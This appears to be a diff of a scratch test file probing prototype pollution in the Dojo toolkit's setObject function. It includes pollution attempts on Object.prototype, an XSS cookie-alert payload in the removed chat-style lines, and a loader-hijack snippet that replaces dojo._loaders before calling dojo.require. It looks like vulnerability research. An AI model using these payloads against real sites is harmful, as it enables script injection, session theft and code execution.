@@ -1,22 +1,31 @@
-Cryptotears, [26.06.2025 12:27]
-const obj = {};
-dojo.setObject("constructor.prototype.vuln", "polluted!", obj);
-console.log({}.vuln);
-
-Cryptotears, [26.06.2025 12:28]
-const obj = {};
-dojo.setObject("foo.prototype.bar", "polluted!", obj);
-console.log({}.bar);
-
-Cryptotears, [26.06.2025 12:28]
 dojo.setObject("proto.vuln", "polluted!", {});
-console.log(Object.prototype);
+console.log("Test 1:", {}.vuln);
 
+dojo.setObject("foo.proto.vuln", "polluted!", {});
+console.log("Test 2:", {}.vuln);
 
-Cryptotears, [26.06.2025 12:31]
-const testObj = {};
-dojo.setObject("test.path", "works", testObj);
-console.log(testObj.test.path);
+const arr = [];
+dojo.setObject("proto.vuln", "polluted!", arr);
+console.log("Array test:", [].vuln);
 
-Cryptotears, [26.06.2025 12:32]
-dojo.setObject("proto.innerHTML", '<img src=x onerror=alert(document.cookie)>', {});
+Object.prototype.vuln = "manual polluted!";
+console.log("Manual test:", {}.vuln);
+
+const obj = {};
+console.log("Before:", obj.constructor);
+
+dojo.setObject("constructor.prototype.vuln", "polluted!", obj);
+
+console.log("After:", obj.constructor);
+console.log("Constructor prototype:", obj.constructor.prototype);
+console.log("Object prototype:", Object.getPrototypeOf({}));
+
+dojo.setObject("_loaders.0", {
+  dynamic: true,
+  execute: function() {
+    alert("Loader hijacked!");
+  }
+}, dojo);
+
+// Инициируем загрузку
+dojo.require("some.module");
